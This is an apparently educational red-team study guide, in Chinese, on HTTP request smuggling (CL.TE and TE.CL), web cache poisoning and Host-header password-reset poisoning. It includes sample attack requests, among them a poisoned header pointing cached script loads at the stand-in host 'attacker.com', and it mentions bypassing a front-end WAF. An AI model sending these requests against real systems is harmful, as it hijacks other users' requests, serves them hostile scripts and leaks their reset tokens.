# 📦 HTTP 請求走私、中介代理語意與快取投毒深度學習路徑 (HTTP Smuggling & Cache Poisoning)
> 對應紅隊作戰矩陣：**Phase 2 (R13)** (R13.1 ~ R13.3)  
> 預計總投入時間：**30 ~ 35 小時**（視 HTTP/1.1 RFC 規範、TCP 串流傳輸與反向代理架構基礎而定）

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                         這份路徑帶你到達的位置
──────────────────                   ────────────────────────────
以為 HTTP 請求是一發一收互不干擾 ──► 精通 Keep-Alive 連線重複使用與前後端長度邊界歧義
對 CL.TE / TE.CL 名詞一知半解   ──► 精通請求走私 (Request Smuggling) 劫持下一個用戶連線
只知道 CDN 能加速網頁          ──► 精通未加密鍵 (Unkeyed Header) 快取投毒覆蓋全網靜態頁面
```

---

## 🧱 第零關：先確認你有這些基礎

| 概念 | 需要了解到的程度 | 快速補充資源 |
|------|-----------------|-------------|
| HTTP/1.1 Pipeline 與 Keep-Alive | 理解單一 TCP 連線上傳輸多個 HTTP 請求的封裝機制 | [RFC 7230: HTTP/1.1 Message Syntax](https://datatracker.ietf.org/doc/html/rfc7230) |
| Content-Length vs Transfer-Encoding | 理解二者在定義 HTTP 訊息本體長度時的衝突優先權 | [PortSwigger: HTTP Request Smuggling Explained](https://portswigger.net/web-security/request-smuggling) |
| Web 快取鍵 (Cache Key) 構造 | 熟悉 HTTP Method, Path, Host 作為預設快取鍵的原理 | [PortSwigger: Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning) |

---

## 🗺️ 整體學習地圖（五個階段）

```
階段一 ──────► 階段二 ──────► 階段三 ──────► 階段四 ──────► 階段五
前後端邊界歧義 CL.TE走私實戰  TE.CL走私實戰  Web快取投毒   Host標頭劫持
(8h)           (8h)           (8h)           (6h)           (4h)
```

---

## 🌪️ 階段一：HTTP 訊息長度邊界歧義與走私物理本質（約 8 小時）

### 1.1 漏洞成因：雙代理伺服器的規格實作差異
在現代架構中，使用者請求通常經過「前端反向代理 (Front-end)」轉發至「後端應用程式伺服器 (Back-end)」。兩者共用同一條長連線 (HTTP Keep-Alive)。
當一個請求同時包含 `Content-Length` (CL) 與 `Transfer-Encoding: chunked` (TE) 標頭時：
- RFC 7230 規定應優先採用 `Transfer-Encoding`。
- 但若其中一方未遵守規範或被惡意混淆（如 `Transfer-Encoding: xchunked`），導致**前端以 CL 計算長度，而後端以 TE 計算**，邊界歧義便產生！

---

## ⚡ 階段二：CL.TE 請求走私實戰與下一個請求前置劫持（約 8 小時）

### 2.1 CL.TE 攻擊構造與資料流剖析
前端處理 `Content-Length`，後端處理 `Transfer-Encoding`：
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
- 前端讀取 13 位元組，將整個請求完整轉發至後端。
- 後端讀取到 `0\r\n\r\n`，認為當前請求已結束；剩餘的 `SMUGGLED` 字串被留在 TCP 接收緩衝區中！
- 當下一個受害者發送 `GET /home HTTP/1.1` 時，後端會將其拼接為 `SMUGGLEDGET /home HTTP/1.1`，攻擊者成功竄改他人的請求！

---

## 🔄 階段三：TE.CL 請求走私實戰（約 8 小時）

### 3.1 前端處理 TE，後端處理 CL
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```
- 前端依照 chunked 解析，轉發全量內容。
- 後端僅依據 `Content-Length: 3` 讀取前 3 位元組，剩餘的惡意請求本體留在緩衝區中等待下一個請求拼接。

---

## 🧪 階段四：Web 快取投毒 (Web Cache Poisoning)（約 6 小時）

### 4.1 未加密鍵 (Unkeyed Inputs) 的濫用
快取伺服器通常僅以 `Request-Method` + `Host` + `Path` 計算快取雜湊鍵 (Cache Key)。
若應用程式會反射某些「不在快取鍵中的標頭」（如 `X-Forwarded-Host`、`X-Original-URL`）：
```http
GET /resources/js/tracking.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- 伺服器回傳：`<script src="http://attacker.com/tracking.js"></script>`。
- 快取伺服器將此惡意響應儲存並快取 24 小時。
- **全網所有訪問該 JavaScript 的正常使用者全面遭受 XSS 攻擊！**

---

## 🏷️ 階段五：Host 與 Forwarded 標頭路由信任濫用（約 4 小時）

### 5.1 密碼重設郵件投毒 (Password Reset Poisoning)
若忘記密碼功能利用 HTTP `Host` 標頭拼接重設連結（`https://` + `request.getHeader("Host")` + `/reset?token=...`）：
- 攻擊者將 `Host` 篡改為 `attacker-controlled.com`。
- 受害者收到官方發送的合法信件，但點擊的重設連結指向攻擊者伺服器，Token 直接洩漏！

---

## ✅ 本路徑通過檢查表（Checklist）

- [ ] 能清楚畫出前端與後端代理在處理 CL 與 TE 時的緩衝區字元殘留示意圖。
- [ ] 掌握 CL.TE 與 TE.CL 兩種場景的畸形封包構造手冊。
- [ ] 能利用請求走私繞過前端反向代理的 WAF 路由封鎖。
- [ ] 掌握 Param Miner 工具探測 Web 快取未入鍵標頭 (Unkeyed Headers)。
- [ ] 能構造 Host 標頭投毒驗證密碼重設連結偽造。
